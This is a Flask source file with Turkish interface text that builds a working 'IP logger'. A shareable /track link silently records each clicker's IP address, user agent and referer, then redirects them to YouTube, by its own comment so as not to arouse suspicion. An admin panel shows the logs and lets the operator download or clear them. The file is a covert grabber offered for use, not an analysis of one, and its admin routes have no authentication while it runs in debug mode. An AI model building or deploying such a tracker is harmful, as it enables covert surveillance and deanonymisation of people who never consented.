from flask import Flask, request, send_file, redirect, render_template_string
import datetime
import os

app = Flask(__name__)

# Ana sayfa - IP tracker link
@app.route('/')
def home():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Link Paylaş</title>
        <meta charset="UTF-8">
        <style>
            body { font-family: Arial; text-align: center; margin-top: 100px; }
            .container { max-width: 600px; margin: 0 auto; }
            .link-box { background: #f0f0f0; padding: 20px; border-radius: 10px; margin: 20px 0; }
            .btn { background: #007bff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
            .btn:hover { background: #0056b3; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔗 Link Paylaşım Sistemi</h1>
            <div class="link-box">
                <h3>Paylaşım Linki:</h3>
                <p><strong>{{ request.url_root }}track</strong></p>
                <p>Bu linki paylaştığınızda tıklayan kişilerin IP adresleri kaydedilir.</p>
            </div>
            <a href="/admin" class="btn">📊 IP Loglarını Görüntüle</a>
            <a href="/download" class="btn">📥 Logları İndir</a>
        </div>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/track')
def track_ip():
    # IP adresini al (proxy arkasında da çalışır)
    ip = request.environ.get('HTTP_X_FORWARDED_FOR',
         request.environ.get('HTTP_X_REAL_IP',
         request.remote_addr))

    # Eğer proxy varsa ilk IP'yi al
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
    referer = request.headers.get('Referer', 'Direkt erişim')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # IP bilgilerini dosyaya kaydet
    log_entry = f"{timestamp} | IP: {ip} | User-Agent: {user_agent} | Referer: {referer}\n"
    with open('ip_logs.txt', 'a', encoding='utf-8') as f:
        f.write(log_entry)

    # Kullanıcıyı başka bir siteye yönlendir (şüphe çekmemek için)
    return redirect('https://www.youtube.com')

@app.route('/admin')
def admin_panel():
    logs = []
    if os.path.exists('ip_logs.txt'):
        with open('ip_logs.txt', 'r', encoding='utf-8') as f:
            logs = f.readlines()

    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>IP Logları - Admin Panel</title>
        <meta charset="UTF-8">
        <style>
            body { font-family: Arial; margin: 20px; }
            .header { text-align: center; margin-bottom: 30px; }
            .log-entry { background: #f8f9fa; padding: 10px; margin: 5px 0; border-left: 4px solid #007bff; }
            .stats { background: #e9ecef; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
            .btn { background: #28a745; color: white; padding: 8px 16px; text-decoration: none; border-radius: 4px; margin: 5px; }
            .btn:hover { background: #218838; }
            .clear-btn { background: #dc3545; }
            .clear-btn:hover { background: #c82333; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🔍 IP Takip Logları</h1>
            <div class="stats">
                <strong>Toplam Ziyaret: {{ log_count }}</strong> |
                <strong>Son Güncelleme: {{ last_update }}</strong>
            </div>
            <a href="/" class="btn">🏠 Ana Sayfa</a>
            <a href="/download" class="btn">📥 İndir</a>
            <a href="/clear" class="btn clear-btn" onclick="return confirm('Tüm logları silmek istediğinizden emin misiniz?')">🗑️ Temizle</a>
        </div>

        {% if logs %}
            {% for log in logs %}
            <div class="log-entry">{{ log.strip() }}</div>
            {% endfor %}
        {% else %}
            <p style="text-align: center; color: #666;">Henüz hiç log kaydı yok.</p>
        {% endif %}

        <script>
            // Sayfa otomatik yenileme (30 saniyede bir)
            setTimeout(function(){ location.reload(); }, 30000);
        </script>
    </body>
    </html>
    '''

    last_update = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return render_template_string(html, logs=reversed(logs), log_count=len(logs), last_update=last_update)

@app.route('/download')
def download_logs():
    if os.path.exists('ip_logs.txt'):
        return send_file('ip_logs.txt',
                        as_attachment=True,
                        download_name=f'ip_logs_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt',
                        mimetype='text/plain')
    return "Henüz hiç log kaydı yok."

@app.route('/clear')
def clear_logs():
    if os.path.exists('ip_logs.txt'):
        os.remove('ip_logs.txt')
    return redirect('/admin')

if __name__ == '__main__':
    print("🚀 IP Logger başlatılıyor...")
    print("📍 Ana sayfa: http://localhost:5000")
    print("🔗 Takip linki: http://localhost:5000/track")
    print("📊 Admin panel: http://localhost:5000/admin")
    app.run(host='0.0.0.0', port=5000, debug=True)